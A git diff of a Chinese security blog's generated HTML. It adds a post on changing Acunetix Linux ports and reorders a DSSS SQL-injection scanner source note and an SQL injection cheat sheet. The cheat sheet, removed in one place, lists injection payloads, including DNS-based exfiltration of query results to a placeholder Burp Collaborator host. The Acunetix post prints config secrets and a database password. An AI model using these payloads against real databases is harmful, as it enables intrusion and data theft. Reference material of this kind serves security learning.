@@ -252,6 +252,209 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/17/Awvs-linux版配置文件修改/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Foolisheddy">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/04/26/5cc1da1c90e1a.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Black House">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/06/17/Awvs-linux版配置文件修改/" itemprop="url">Awvs-linux版配置文件修改</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-17T22:36:34+08:00">
+                2019-06-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/SecurityTools/" itemprop="url" rel="index">
+                    <span itemprop="name">SecurityTools</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="pre"><a href="#pre" class="headerlink" title="pre:"></a>pre:</h1><p>linux版相较于wins版,默认配置有些许差异</p>
+<table>
+<thead>
+<tr>
+<th>version</th>
+<th>api-port</th>
+<th>db-port</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>wins</td>
+<td>3443</td>
+<td>35432</td>
+</tr>
+<tr>
+<td>linux</td>
+<td>13443</td>
+<td>45432</td>
+</tr>
+</tbody></table>
+<p>现在要把linux的修改成wins的一样。。。</p>
+<hr>
+<h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件:"></a>配置文件:</h1><h2 id="wvs-ini："><a href="#wvs-ini：" class="headerlink" title="wvs.ini："></a>wvs.ini：</h2><p>配置文件</p>
+<p>路径:<code>/home/acunetix/.acunetix_trial/wvs.ini</code></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">logging.file.file_name=~/.acunetix_trial/logs/backend.log</span><br><span class="line"><span class="attr">base_storage</span>=~/.acunetix_trial/data</span><br><span class="line">logging.file.level=INFO</span><br><span class="line">server.address=0.0.0.0</span><br><span class="line">server.port=3443 # !!!edit</span><br><span class="line">server.host=debian</span><br><span class="line">server.frontend.session_secret=6rRI3RtEOQbZJLXdQBIZdhKzL8q4D2YS</span><br><span class="line">wvs.temp_dir=~/.acunetix_trial/data/temp</span><br><span class="line"><span class="attr">target_secret_salt</span>=<span class="number">1</span>e79Bc99vW2r4H51chSULiA5WCXXPCGQ</span><br><span class="line"><span class="attr">uploads_salt</span>=mX75i7UNuXVKStEjM2ihLQy4SByclCkB</span><br><span class="line">server.ssl.certificate=~/.acunetix_trial/data/certs/server.cer</span><br><span class="line">server.ssl.private_key=~/.acunetix_trial/data/certs/server.key</span><br><span class="line">databases.connections.master.connection.user=acunetix</span><br><span class="line">databases.connections.master.connection.host=0.0.0.0</span><br><span class="line">databases.connections.master.connection.port=35432 # !!!edit</span><br><span class="line">databases.connections.master.connection.db=wvs</span><br><span class="line">databases.connections.master.connection.password=j3ASXBKVp7f9lZDii9JwJKyKOUjI2ezy</span><br><span class="line">server.static_document_root=~/.acunetix_trial/v_190325161/ui</span><br><span class="line">wvs.app_dir=~/.acunetix_trial/v_190325161/scanner</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h2><p>启动脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">version=v_190325161</span><br><span class="line">db_port=35432  <span class="comment"># !!!edit</span></span><br><span class="line">product_name=acunetix_trial</span><br><span class="line">engine_only=0</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$engine_only</span> != 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"attempting to stop previous database"</span></span><br><span class="line">    ~/.<span class="variable">$product_name</span>/<span class="variable">$version</span>/database/bin/pg_ctl -D ~/.<span class="variable">$product_name</span>/db -w stop</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"attempting to start the db"</span></span><br><span class="line">    setsid ~/.<span class="variable">$product_name</span>/<span class="variable">$version</span>/database/bin/pg_ctl -D ~/.<span class="variable">$product_name</span>/db -o <span class="string">"--port=<span class="variable">$db_port</span>"</span> -w start</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"attempting to start the backend"</span></span><br><span class="line"><span class="comment">#~/.$product_name/$version/venv/bin/python3 ~/.$product_name/$version/backend/wvs.py --conf ~/.$product_name/wvs.ini</span></span><br><span class="line"><span class="built_in">cd</span> ~/.<span class="variable">$product_name</span>/<span class="variable">$version</span>/backend/</span><br><span class="line">~/.<span class="variable">$product_name</span>/<span class="variable">$version</span>/backend/opsrv --conf ~/.<span class="variable">$product_name</span>/wvs.ini</span><br><span class="line"></span><br><span class="line">backend_exit_code=$?</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"backend exited with"</span> <span class="variable">$backend_exit_code</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$engine_only</span> != 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"attempting to stop the database"</span></span><br><span class="line">    ~/.<span class="variable">$product_name</span>/<span class="variable">$version</span>/database/bin/pg_ctl -D ~/.<span class="variable">$product_name</span>/db -w stop</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"bye."</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> <span class="variable">$backend_exit_code</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="数据库文件"><a href="#数据库文件" class="headerlink" title="数据库文件:"></a>数据库文件:</h1><h2 id="pg-hba-conf"><a href="#pg-hba-conf" class="headerlink" title="pg_hba.conf:"></a>pg_hba.conf:</h2><p>路径: <code>/home/acunetix/.acunetix_trial/db/pg_hba.conf</code></p>
+<p><img src="https://i.loli.net/2019/06/17/5d07572f4704659796.png" alt=""></p>
+<p>跟原来的wins有些许差异.</p>
+<table>
+<thead>
+<tr>
+<th>version</th>
+<th>method</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>wins</td>
+<td>trust</td>
+</tr>
+<tr>
+<td>linux</td>
+<td>md5</td>
+</tr>
+</tbody></table>
+<p>按上面的提示所说,<code>wins</code>的是用了<code>trust</code>是明文,linux是用加密的密码去连接.后面实际连接数据库要用.</p>
+<hr>
+<h2 id="postgresql-conf"><a href="#postgresql-conf" class="headerlink" title="postgresql.conf"></a>postgresql.conf</h2><p>路径: <code>/home/acunetix/.acunetix_trial/db/postgresql.conf</code></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">listen_addresses</span> = <span class="string">'*'</span> # !!!edit</span><br><span class="line"><span class="attr">port</span> = <span class="number">45432</span></span><br><span class="line"><span class="attr">max_connections</span> = <span class="number">100</span></span><br><span class="line"><span class="attr">ssl</span> = <span class="literal">off</span></span><br><span class="line"><span class="attr">shared_buffers</span> = <span class="number">128</span>MB</span><br><span class="line"><span class="attr">huge_pages</span> = try</span><br><span class="line"><span class="attr">event_source</span> = <span class="string">'Acunetix Trial Database'</span></span><br><span class="line"><span class="attr">client_min_messages</span> = notice</span><br><span class="line"><span class="attr">log_min_messages</span> = fatal</span><br><span class="line"><span class="attr">log_min_error_statement</span> = fatal</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>然后就可以连接了。。。</p>
+<p><img src="https://i.loli.net/2019/06/18/5d085b3be432277542.png" alt=""></p>
+<p>密码在<code>wvs.ini</code>里。</p>
+<hr>
+<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><p><a href="https://www.acunetix.com/blog/category/docs/" target="_blank" rel="noopener">acunetix docs</a></p>
+<p>没事看看文档或者他家的博客,学习点扫描器思路再拿来自己写扫描器也是不错滴.</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/30/记录-uwsgi+celery+psycopg2连接问题排错过程/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1434,7 +1637,7 @@ supervisor命令行的客户端名称是supervisorctl。它为supervisord提供�
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/01/Sqli-SQL injection cheat sheet/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/01/dsss源码-100行的SqliScanner-源码分析笔记/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Foolisheddy">
@@ -1453,7 +1656,7 @@ supervisor命令行的客户端名称是supervisorctl。它为supervisord提供�
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/05/01/Sqli-SQL injection cheat sheet/" itemprop="url">SQL injection cheat sheet</a></h1>
+                <a class="post-title-link" href="/2019/05/01/dsss源码-100行的SqliScanner-源码分析笔记/" itemprop="url">dsss源码-100行的SqliScanner-源码分析笔记</a></h1>
         
 
         <div class="post-meta">
@@ -1488,8 +1691,8 @@ supervisor命令行的客户端名称是supervisorctl。它为supervisord提供�
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/WebSecurity/" itemprop="url" rel="index">
-                    <span itemprop="name">WebSecurity</span>
+                  <a href="/categories/SourceCodeReading/" itemprop="url" rel="index">
+                    <span itemprop="name">SourceCodeReading</span>
                   </a>
                 </span>
 
@@ -1527,273 +1730,30 @@ supervisor命令行的客户端名称是supervisorctl。它为supervisord提供�
       
         
           
-            <p>This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.</p>
-<h1 id="String-concatenation-字符串连接"><a href="#String-concatenation-字符串连接" class="headerlink" title="String concatenation 字符串连接"></a>String concatenation 字符串连接</h1><p>You can concatenate together multiple strings to make a single string.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left">`’foo’</td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>&#39;foo&#39;+&#39;bar&#39;</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left">`’foo’</td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>&#39;foo&#39; &#39;bar&#39; [Note the space between the two strings]</code> <br> <code>CONCAT(&#39;foo&#39;,&#39;bar&#39;)</code></td>
-</tr>
-</tbody></table>
+            <h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>最近想要写个Auto Sqli Scanner,故找了sqlmap作者写的工具DSSS来参考.</p>
+<blockquote>
+<p>Damn Small SQLi Scanner (DSSS) is a fully functional SQL injection vulnerability scanner (supporting GET and POST parameters) written in under 100 lines of code.</p>
+</blockquote>
+<p>之前也看过一部分<code>sqlmap</code>的源码，看起来头真的有点大。</p>
+<p>相比强大的<code>sqlmap</code>来说,这个工具短小精悍,便于食用,毕竟代码量少很多hhh.</p>
+<p>原仓库地址:<a href="https://github.com/stamparm/DSSS" target="_blank" rel="noopener">Damn Small SQLi Scanner</a><br>我的源代码注释版本:<code>https://github.com/jerrychan807/DSSS</code></p>
 <hr>
-<h1 id="Comments-注释"><a href="#Comments-注释" class="headerlink" title="Comments 注释"></a>Comments 注释</h1><p>You can use comments to truncate a query and remove the portion of the original query that follows your input.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left"><code>--comment</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>--comment</code> <br> <code>/*comment*/</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>--comment</code> <br> <code>/*comment*/</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>#comment</code> <br><code>-- comment [Note the space after the double dash]</code> <br><code>/*comment*/</code></td>
-</tr>
-</tbody></table>
+<h1 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程:"></a>整体流程:</h1><p><img src="https://i.loli.net/2019/05/06/5cd054aa1e705.png" alt=""></p>
 <hr>
-<h1 id="Database-version-数据库版本"><a href="#Database-version-数据库版本" class="headerlink" title="Database version 数据库版本"></a>Database version 数据库版本</h1><p>You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left"><code>SELECT banner FROM v$version</code> <br><code>SELECT version FROM v$instance</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>SELECT @@version</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>SELECT version()</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>SELECT @@version</code></td>
-</tr>
-</tbody></table>
+<h2 id="提取内容函数："><a href="#提取内容函数：" class="headerlink" title="提取内容函数："></a>提取内容函数：</h2><p><img src="https://i.loli.net/2019/05/06/5cd0550f672ff.png" alt=""></p>
+<p>亮点:</p>
+<ul>
+<li>TEXT文本的处理</li>
+</ul>
 <hr>
-<h1 id="Database-contents"><a href="#Database-contents" class="headerlink" title="Database contents"></a>Database contents</h1><p>You can list the tables that exist in the database, and the columns that those tables contain.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left"><code>SELECT * FROM all_tables</code> <br> <code>SELECT * FROM all_tab_columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
-</tr>
-</tbody></table>
+<h2 id="基于报错的测试"><a href="#基于报错的测试" class="headerlink" title="基于报错的测试:"></a>基于报错的测试:</h2><p><img src="https://i.loli.net/2019/05/06/5cd0557531ada.png" alt=""></p>
 <hr>
-<h1 id="Conditional-errors"><a href="#Conditional-errors" class="headerlink" title="Conditional errors"></a>Conditional errors</h1><p>You can test a single boolean condition and trigger a database error if the condition is true.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&#39;a&#39;)</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="Batched-or-stacked-queries"><a href="#Batched-or-stacked-queries" class="headerlink" title="Batched (or stacked) queries"></a>Batched (or stacked) queries</h1><p>You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left"><code>Does not support batched queries.</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>Does not support batched queries.</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="Time-delays"><a href="#Time-delays" class="headerlink" title="Time delays"></a>Time delays</h1><p>You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left"><code>dbms_pipe.receive_message((&#39;a&#39;),10)</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>WAITFOR DELAY &#39;0:0:10&#39;</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>SELECT pg_sleep(10)</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>SELECT sleep(10)</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="Conditional-time-delays"><a href="#Conditional-time-delays" class="headerlink" title="Conditional time delays"></a>Conditional time delays</h1><p>You can test a single boolean condition and trigger a time delay if the condition is true.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left">`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN ‘a’</td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY &#39;0:0:10&#39;</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>SELECT IF(YOUR-CONDITION-HERE,sleep(10),&#39;a&#39;)</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="DNS-lookup"><a href="#DNS-lookup" class="headerlink" title="DNS lookup"></a>DNS lookup</h1><p>You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left">``</td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left">``</td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left">``</td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left">``</td>
-</tr>
-</tbody></table>
-<p>Oracle    The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<br><code>SELECT extractvalue(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code></p>
-<p>The following technique works on fully patched Oracle installations, but requires elevated privileges:<br>SELECT UTL_INADDR.get_host_address(‘YOUR-SUBDOMAIN-HERE.burpcollaborator.net’)</p>
-<p>Microsoft    exec master..xp_dirtree ‘//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a’<br>PostgreSQL    copy (SELECT ‘’) to program ‘nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net’<br>MySQL    The following techniques work on Windows only:<br>LOAD_FILE(‘\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a’)<br>SELECT … INTO OUTFILE ‘\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a’</p>
-<hr>
-<h1 id="DNS-lookup-with-data-exfiltration"><a href="#DNS-lookup-with-data-exfiltration" class="headerlink" title="DNS lookup with data exfiltration"></a>DNS lookup with data exfiltration</h1><p>You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left">``</td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left">``</td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left">``</td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left">``</td>
-</tr>
-</tbody></table>
-<p>Oracle    SELECT extractvalue(xmltype(‘<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]&gt;’),’/l’) FROM dual<br>Microsoft    declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(‘master..xp_dirtree “//‘+@p+’.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a”‘)<br>PostgreSQL    create OR replace function f() returns void as $$<br>declare c text;<br>declare p text;<br>begin<br>SELECT into p (SELECT YOUR-QUERY-HERE);<br>c := ‘copy (SELECT ‘’’’) to program ‘’nslookup ‘||p||’.YOUR-SUBDOMAIN-HERE.burpcollaborator.net’’’;<br>execute c;<br>END;<br>$$ language plpgsql security definer;<br>SELECT f();<br>MySQL    The following technique works on Windows only:<br>SELECT YOUR-QUERY-HERE INTO OUTFILE ‘\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a’</p>
-<hr>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><hr>
-<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1>
+<h2 id="基于布尔的测试"><a href="#基于布尔的测试" class="headerlink" title="基于布尔的测试:"></a>基于布尔的测试:</h2><p><img src="https://i.loli.net/2019/05/06/5cd05595e835e.png" alt=""></p>
+<p>在页面文本相似度那里,对于0.95那个理解有点费劲,提了个<a href="https://github.com/stamparm/DSSS/issues/8" target="_blank" rel="noopener">issue</a>问作者.</p>
+<p>作者很nice,也很快就回复我了。我才get到它这里面的判断有2种:精确判断和模糊判断.</p>
+<p>精确判断：可以通过<code>HTTP-CODE</code>和<code>TITLE</code>来判断两个页面是否是100%一样</p>
+<p>模糊判断: 通过<code>quick_ratio</code>来计算两个页面的文本相似度,因为<code>quick_ratio</code>计算有时不太准确,有一定的误差,故<code>FUZZY_THRESHOLD = 0.95</code>设置如此,留了5%做误差.</p>
+
           
         
       
@@ -2007,7 +1967,7 @@ supervisor命令行的客户端名称是supervisorctl。它为supervisord提供�
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/01/dsss源码-100行的SqliScanner-源码分析笔记/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/01/Sqli-SQL injection cheat sheet/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Foolisheddy">
@@ -2026,7 +1986,7 @@ supervisor命令行的客户端名称是supervisorctl。它为supervisord提供�
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/05/01/dsss源码-100行的SqliScanner-源码分析笔记/" itemprop="url">dsss源码-100行的SqliScanner-源码分析笔记</a></h1>
+                <a class="post-title-link" href="/2019/05/01/Sqli-SQL injection cheat sheet/" itemprop="url">SQL injection cheat sheet</a></h1>
         
 
         <div class="post-meta">
@@ -2061,8 +2021,8 @@ supervisor命令行的客户端名称是supervisorctl。它为supervisord提供�
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/SourceCodeReading/" itemprop="url" rel="index">
-                    <span itemprop="name">SourceCodeReading</span>
+                  <a href="/categories/WebSecurity/" itemprop="url" rel="index">
+                    <span itemprop="name">WebSecurity</span>
                   </a>
                 </span>
 
@@ -2100,341 +2060,282 @@ supervisor命令行的客户端名称是supervisorctl。它为supervisord提供�
       
         
           
-            <h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>最近想要写个Auto Sqli Scanner,故找了sqlmap作者写的工具DSSS来参考.</p>
-<blockquote>
-<p>Damn Small SQLi Scanner (DSSS) is a fully functional SQL injection vulnerability scanner (supporting GET and POST parameters) written in under 100 lines of code.</p>
-</blockquote>
-<p>之前也看过一部分<code>sqlmap</code>的源码，看起来头真的有点大。</p>
-<p>相比强大的<code>sqlmap</code>来说,这个工具短小精悍,便于食用,毕竟代码量少很多hhh.</p>
-<p>原仓库地址:<a href="https://github.com/stamparm/DSSS" target="_blank" rel="noopener">Damn Small SQLi Scanner</a><br>我的源代码注释版本:<code>https://github.com/jerrychan807/DSSS</code></p>
+            <p>This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.</p>
+<h1 id="String-concatenation-字符串连接"><a href="#String-concatenation-字符串连接" class="headerlink" title="String concatenation 字符串连接"></a>String concatenation 字符串连接</h1><p>You can concatenate together multiple strings to make a single string.</p>
+<table>
+<thead>
+<tr>
+<th align="left">database</th>
+<th align="left">example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Oracle</td>
+<td align="left">`’foo’</td>
+</tr>
+<tr>
+<td align="left">Microsoft</td>
+<td align="left"><code>&#39;foo&#39;+&#39;bar&#39;</code></td>
+</tr>
+<tr>
+<td align="left">PostgreSQL</td>
+<td align="left">`’foo’</td>
+</tr>
+<tr>
+<td align="left">MySQL</td>
+<td align="left"><code>&#39;foo&#39; &#39;bar&#39; [Note the space between the two strings]</code> <br> <code>CONCAT(&#39;foo&#39;,&#39;bar&#39;)</code></td>
+</tr>
+</tbody></table>
 <hr>
-<h1 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程:"></a>整体流程:</h1><p><img src="https://i.loli.net/2019/05/06/5cd054aa1e705.png" alt=""></p>
